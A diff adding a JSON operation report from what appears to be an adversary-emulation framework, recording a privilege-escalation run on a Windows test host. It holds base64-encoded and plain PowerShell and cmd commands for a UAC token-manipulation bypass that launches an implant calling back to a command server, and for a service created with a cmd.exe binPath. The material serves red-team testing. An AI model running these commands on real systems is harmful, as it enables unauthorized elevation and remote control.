@@ -1,0 +1,166 @@
+{
+    "adversary": {
+        "adversary_id": "348eee1a-75a1-4493-961f-e03b758a225b",
+        "description": "escalation",
+        "id": 28,
+        "name": "privilege",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "088b8639-3f37-42cc-9dc8-01aabb64T1050-1",
+                    "adversary_map_id": 170,
+                    "cleanup": "",
+                    "description": "New Service",
+                    "executor": "cmd",
+                    "id": 170,
+                    "name": "New Service - Create & Start",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 170,
+                            "payload": "mitredslabs.exe"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1050",
+                    "technique_name": "New Service (T1050)",
+                    "test": "c2MuZXhlIGNyZWF0ZSBtaXRyZWRzbGFicyBiaW5QYXRoPSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGU7CnNjLmV4ZSBzdGFydCBtaXRyZWRzbGFiczs="
+                },
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "adversary_map_id": 169,
+                    "cleanup": "",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "psh",
+                    "id": 172,
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 172,
+                            "payload": "update.ps1,Invoke-BypassUACTokenManipulation.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1088",
+                    "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlOwpNb3ZlLUl0ZW0gLVBhdGggLlx1cGRhdGUucHMxIC1EZXN0aW5hdGlvbiAkZW52OkFQUERBVEEgLUZvcmNlOwokcGNvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCJJbXBvcnQtTW9kdWxlICRlbnY6QVBQREFUQVx1cGRhdGUucHMxO3VwZGF0ZSgnI3tzZXJ2ZXJ9JykiKSk7Ckludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbiAtQXJndW1lbnRzICItbm9wIC1leGVjIGJ5cGFzcyAtRW5jb2RlZENvbW1hbmQgJHBjb2RlIiAtVmVyYm9zZQ=="
+                },
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "adversary_map_id": 169,
+                    "cleanup": "",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "pwsh",
+                    "id": 173,
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 173,
+                            "payload": "update.ps1,Invoke-BypassUACTokenManipulation.ps1"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "privilege-escalation",
+                    "technique_id": "T1088",
+                    "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)",
+                    "test": "SW1wb3J0LU1vZHVsZSAuXEludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbi5wczEgLVZlcmJvc2UgLUZvcmNlOwpNb3ZlLUl0ZW0gLVBhdGggLlx1cGRhdGUucHMxIC1EZXN0aW5hdGlvbiAkZW52OkFQUERBVEEgLUZvcmNlOwokcGNvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCJJbXBvcnQtTW9kdWxlICRlbnY6QVBQREFUQVx1cGRhdGUucHMxO3VwZGF0ZSgnI3tzZXJ2ZXJ9JykiKSk7Ckludm9rZS1CeXBhc3NVQUNUb2tlbk1hbmlwdWxhdGlvbiAtQXJndW1lbnRzICItbm9wIC1leGVjIGJ5cGFzcyAtRW5jb2RlZENvbW1hbmQgJHBjb2RlIiAtVmVyYm9zZQ=="
+                }
+            ]
+        }
+    },
+    "facts": [],
+    "finish": "2019-10-29 07:13:49",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-29 07:13:49",
+            "last_trusted_seen": "2019-10-29 07:13:49",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 3280,
+            "platform": "windows",
+            "ppid": 3496,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "4/8",
+    "name": "escala",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": []
+        }
+    ],
+    "start": "2019-10-29 07:13:10",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "1345bff7-6f26-43b2-a92a-9aabccdb3db0",
+                    "attack": {
+                        "tactic": "privilege-escalation",
+                        "technique_id": "T1088",
+                        "technique_name": "Bypass User Account Control (T1088) via Access Token Manipulation (T1134)"
+                    },
+                    "command": "Import-Module .\\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"Import-Module $env:APPDATA\\update.ps1;update('http://10.203.202.154:8888')\"));Invoke-BypassUACTokenManipulation -Arguments \"-nop -exec bypass -EncodedCommand $pcode\" -Verbose",
+                    "delegated": "2019-10-29 07:13:44.220346",
+                    "description": "A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",
+                    "executor": "psh",
+                    "name": "3.A.1 - Bypass User Account Control (T1088)",
+                    "platform": "windows",
+                    "run": "2019-10-29 07:13:45",
+                    "status": 0
+                },
+                {
+                    "ability_id": "088b8639-3f37-42cc-9dc8-01aabb64T1050-1",
+                    "attack": {
+                        "tactic": "privilege-escalation",
+                        "technique_id": "T1050",
+                        "technique_name": "New Service (T1050)"
+                    },
+                    "command": "sc.exe create mitredslabs binPath= C:\\Windows\\System32\\cmd.exe;sc.exe start mitredslabs;",
+                    "delegated": "2019-10-29 07:13:44.220559",
+                    "description": "New Service",
+                    "executor": "cmd",
+                    "name": "New Service - Create & Start",
+                    "platform": "windows",
+                    "run": "2019-10-29 07:13:49",
+                    "status": 1
+                }
+            ]
+        }
+    }
+}
